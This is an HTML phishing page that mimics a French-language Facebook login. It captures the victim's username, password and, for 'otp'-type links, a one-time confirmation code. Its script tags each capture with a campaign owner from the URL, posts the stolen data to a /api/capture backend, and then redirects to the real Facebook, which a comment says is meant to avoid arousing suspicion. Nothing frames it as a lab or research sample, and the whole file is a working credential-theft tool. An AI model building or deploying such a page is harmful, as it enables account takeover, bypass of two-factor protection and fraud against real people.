<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion — Facebook</title>
    <style>
        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .fb-container { display: flex; width: 980px; justify-content: space-between; align-items: center; padding: 20px; }
        .fb-left { width: 500px; padding-right: 32px; }
        .fb-left h1 { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 10px; }
        .fb-left p { font-size: 28px; line-height: 32px; color: #1c1e21; }
        .fb-card { background: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); width: 396px; text-align: center; }
        .fb-card input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
        .fb-btn { background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 20px; font-weight: bold; line-height: 48px; width: 100%; cursor: pointer; transition: 0.2s; }
        .fb-btn:hover { background-color: #166fe5; }
        .otp-section { display: none; margin-top: 15px; border-top: 1px solid #dadde1; padding-top: 15px; }
    </style>
</head>
<body>

<div class="fb-container">
    <div class="fb-left">
        <h1>facebook</h1>
        <p>Avec Facebook, partagez et restez en contact avec votre entourage.</p>
    </div>
    <div class="fb-card">
        <form id="phish-form" onsubmit="handleSubmit(event)">
            <input type="text" id="v-user" placeholder="Adresse e-mail ou numéro de tél." required>
            <input type="password" id="v-pass" placeholder="Mot de passe" required>
            
            <div id="otp-box" class="otp-section">
                <input type="text" id="v-otp" placeholder="Code de confirmation (OTP)">
            </div>

            <button type="submit" class="fb-btn">Se connecter</button>
        </form>
    </div>
</div>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const campaignOwner = urlParams.get('user') || 'Inconnu';
    const linkType = urlParams.get('type') || 'standard';

    // Si le lien est de type "otp", on affiche le champ supplémentaire pour le code
    if (linkType === 'otp') {
        document.getElementById('otp-box').style.display = 'block';
    }

    function handleSubmit(event) {
        event.preventDefault();
        
        const payload = {
            owner: campaignOwner,
            network: "Facebook",
            type: linkType,
            victimUser: document.getElementById('v-user').value,
            victimPass: document.getElementById('v-pass').value,
            otp: document.getElementById('v-otp').value || 'Aucun'
        };

        // Envoi des données capturées vers le backend Python (/api/capture)
        fetch('/api/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).then(response => {
            // Redirection vers la vraie plateforme pour ne pas éveiller les soupçons
            window.location.href = "https://www.facebook.com";
        }).catch(error => {
            window.location.href = "https://www.facebook.com";
        });
    }
</script>

</body>
</html>
